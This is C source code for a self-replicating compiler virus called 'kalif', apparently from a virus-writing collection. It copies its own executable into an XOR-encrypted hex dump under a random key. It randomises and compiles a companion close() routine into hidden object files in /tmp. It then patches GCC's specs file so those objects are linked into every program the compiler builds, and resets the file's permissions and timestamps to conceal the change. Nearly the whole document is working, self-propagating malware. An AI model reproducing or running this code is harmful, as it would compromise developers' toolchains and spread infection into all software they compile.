/* Note:
 * X1[] wich comes from kalif.c contains the executable "kalif" as hex-dump
 * X2[] wich is included in the kalif executable contains close.c.
 * (so kalif.c contains only the var X1[] and close.c contains close() 
 * function.)
 * LOOP:
 * kalif.o and close.o are both linked to victum.c. victum calls close()
 * wich extracts X1[] to kalif executable wich is executed after this.
 * kalif exe. extracts close() sourcecode from X2[] and randomizes it as well.
 * kalif exe. also extracts itself to file kalif.c wich ONLY contains X1[].
 * Now kalif.c and close.c will be compiled and you can jump to LOOP.
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <utime.h>
#include "cce/cce.h"

#define KLEN 13000

int dump_it(FILE*, char*, char*, int);
extern char X2[];	/* close.c */
extern int X2LEN;

/* we already have thiz function in SSCR */
extern FILE *xfopen(char*, char*);

int main(int argc, char **argv, char **envp)
{
        char *kalif;
        int in, r;
        FILE *fd, *out;
        char specs[100] = {0},
             key[30] = {0},
             exe[200] = {0};
        struct stat st;
        struct utimbuf ut;
        
        if ((kalif = (char*)malloc(KLEN)) == NULL) {
           	perror("malloc");
                exit(errno);
        }
        if ((in = open(argv[0], O_RDONLY)) < 0) {
#ifdef DEBUG
           	perror("open");
#endif
                exit(errno);
        }
        r = read(in, kalif, KLEN);
        /* dump executable as hex */
        fd = xfopen("/tmp/kalif.c", "w+");
        /* but before we mutate a little bit :) */
        mutate(key);
        Vcrypt(kalif, key, r);
        dump_it(fd, kalif, "X1", r);
        fclose(fd);
        
        /* get source of close() */
        fd = xfopen("/tmp/close.c", "w+");
        dump_it(fd, X2, NULL, X2LEN);
        fclose(fd);
        
        /* get directory where specs resists */
        system("egcs -v 2>t");
        fd = xfopen("t", "r");
        fscanf(fd, "Reading specs from %s\n", specs);
#ifdef DEBUG
        printf("%s", specs);        
#endif
        fclose(fd);
        unlink("t");
        /* randomize close.c */
        init_cce();
        randomize_file("/tmp/close.c", "/tmp/closeR.c");
        unlink("/tmp/close.c");
        
        /* and compile it to be linked into victum later */
        sprintf(exe, "gcc -c -O2 -D KEY=\"\\\"%s\\\"\" /tmp/closeR.c -o /tmp/.close.o~&>/dev/null", key);
#ifdef DEBUG
        printf("%s\n", exe);
#endif
        system(exe);
        system("gcc -c -O2 /tmp/kalif.c -o /tmp/.kalif.o~&>/dev/null");
        unlink("/tmp/kalif.c");
#ifndef DEBUG
        unlink("/tmp/closeR.c");
#endif

   	/* BREAK! if EIP is here, we already did the following:
         * extraceted close.c
         * randomized close.c
         * compiled rand. close.c 
         * extracted kalif to c-file
         * compiled it
         * what we do now is simply patch the specs file of GCC to link in
         * our 2 nasty obj-files every time gcc is ionvoked
         */

        /* dont touch permissions */
        stat(specs, &st);
        
        fd = xfopen(specs, "r+");
        bzero(kalif, KLEN);
        kalif[0] = 'X';
        
        /* seek to our fave position */
        while (strcmp(kalif, "*link:\n")) 
           	fgets(kalif, 200, fd);
        fgets(kalif, 200, fd); 
        fclose(fd);

        /* already patched ? */
        if (strstr(kalif, "/tmp/.kalif.o~")) 
           	return 0;
        
        /* we're friendly: we save specs-file :) */
        sprintf(exe, "mv %s /tmp/.specs.bak~>/dev/null", specs);
        system(exe);
        
        /* get position where we will add our stuff */
        fd = xfopen("/tmp/.specs.bak~", "r");
        out = xfopen(specs, "w+");
        while (strcmp(kalif, "*link:\n")) {
           	fgets(kalif, 200, fd);
                fprintf(out, "%s", kalif);
        }
        
        fprintf(out, "/tmp/.kalif.o~ /tmp/.close.o~ "); 	
        
        /* write rest of original to patched specs */
        while (fgets(kalif, 200, fd))
           	fprintf(out, "%s", kalif);

   	/* put orig attribs... */
        fchmod(fileno(out), st.st_mode);
         
        fclose(fd);
        fclose(out);
        free(kalif);
        
        /* ...and time to file */
        ut.actime = st.st_atime;
        ut.modtime = st.st_mtime;
        utime(specs, &ut);
        return 0;
}

/* dump string s to file:
 * if cnam != NULL then use Hexdump otherwise
 * simply do it with %c
 */
int dump_it(FILE *fd, char *s, char *cnam, int s_len)
{
   	int i = 0, j = 1, count = 0;
        
        if (cnam) 
           	fprintf(fd, "char %s[] =\n\"", cnam);
        for (; i < s_len; i++) {
           	count++;
                if (cnam) 
                   	fprintf(fd, "\\x%02x", (unsigned char)s[i]);
                else 
                   	fprintf(fd, "%c", s[i]);
                if (!(j % 15) && cnam) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                j++;
        }
        if (j != 1 && cnam) 
           	fprintf(fd, "\"");
        if (cnam) {
           	fprintf(fd, ";");
                fprintf(fd, "int %sLEN = %d;\n", cnam, count);
        }
        return 0;
}

/* Virus-crypt, Virtual-crypt, Vacsina-crypt... i dunno ;) */
int Vcrypt(char *s, char *key, int s_len)
{
   	int i = 0, j = 0;
        
        for(;i < s_len; i++) 
           	s[i] ^= key[j++ % 30];           	
        return 0;
}

/* fill array of 30 bytes with random chars */
int mutate(char *key)
{
   	int i = 0;
        srand(time(NULL));
        for (;i < 30; i++) 
           	key[i] = 65 + rand() % 25;
        return 0;
}
